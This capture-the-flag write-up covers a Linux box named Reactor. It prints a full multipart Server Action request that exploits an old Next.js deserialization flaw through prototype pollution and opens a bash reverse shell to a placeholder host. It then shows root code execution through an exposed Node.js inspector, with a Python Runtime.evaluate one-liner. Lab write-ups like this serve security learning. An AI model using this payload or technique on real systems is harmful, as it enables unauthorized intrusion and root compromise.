# CTF – Reactor (Writeup)

## Context
Reactor is a Linux box running a web application built on a very old, end-of-life
version of Next.js. The front end exposes React Server Actions, and the outdated
framework is vulnerable to a server-side deserialization flaw rated CVSS 10. The
box also runs a Node.js process with its debug inspector left open on localhost.

## Recon
No port scan was kept for this box. The relevant surface is the Next.js app served
over HTTP and SSH for the `engineer` user (target at `10.129.5.181`). What stood out
was the Next.js version leaked in the bundled JavaScript: an ancient release that
still accepts Server Action payloads through the `Next-Action` header, which is the
entry point for the RCE.

## Initial access – Next.js Server Action deserialization RCE
Old Next.js versions deserialize Server Action arguments from a multipart body and
resolve a "thenable" object graph. By pointing the resolution chain at
`__proto__` and `constructor:constructor`, I get prototype pollution that lets the
server evaluate an attacker-controlled string, which I use to spawn a reverse shell.

The request I sent (to the app root, with a normal-looking browser fingerprint):

```
POST / HTTP/1.1
Host: redacted.com
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,
 "value":"{\"then\":\"$B1337\"}",
 "_response":{"_prefix":"process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/TON_IP/TON_PORT 0>&1\" &');throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=ok;307;`});",
   "_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"
"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"
[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

The `_prefix` field is the payload: `process.mainModule.require('child_process').exec(...)`
runs a bash reverse shell, then throws a fake `NEXT_REDIRECT` so the response looks
benign. After setting the listener and substituting my IP/port, I caught a shell
running as the web application user.

## Privilege escalation – Node.js inspector (CDP) running as root
From the shell I enumerated running services and found one listening on
`127.0.0.1:9229` — the Node.js inspector / Chrome DevTools Protocol port. That
process was running as root.

I forwarded the port to my machine over SSH:

```
ssh -L 9229:127.0.0.1:9229 engineer@10.129.5.181
```

Then `curl http://localhost:9229/json` returned the debugger session ID/websocket
URL. The inspector lets you evaluate arbitrary JavaScript in the target process, so
I connected to the websocket and called `Runtime.evaluate` to run a command as root:

```
python3 -c "import websocket, json; \
ws = websocket.create_connection('ws://127.0.0.1:9229/0d3dc86f-c015-4fb9-892b-1afa489137b6'); \
ws.send(json.dumps({'id':1,'method':'Runtime.evaluate','params':{'expression':\
\"process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()\"}})); \
print(ws.recv())"
```

Because the inspected process ran as root, `execSync` read `/root/root.txt` directly.

## Conclusion
An outdated Next.js accepted a malicious Server Action payload that, through
prototype pollution, executed `child_process.exec` and gave me a shell as the web
user. A root-owned Node.js process with its inspector exposed on `127.0.0.1:9229`
was reachable after an SSH local forward; the Chrome DevTools Protocol then let me
run arbitrary code as root.

## Skills demonstrated
- Exploiting React Server Actions / Next.js deserialization (prototype pollution to RCE)
- Crafting multipart Server Action payloads with the `Next-Action` header
- Service enumeration on localhost-only ports
- SSH local port forwarding to reach an internal service
- Abusing the Node.js inspector (CDP `Runtime.evaluate`) for code execution as root
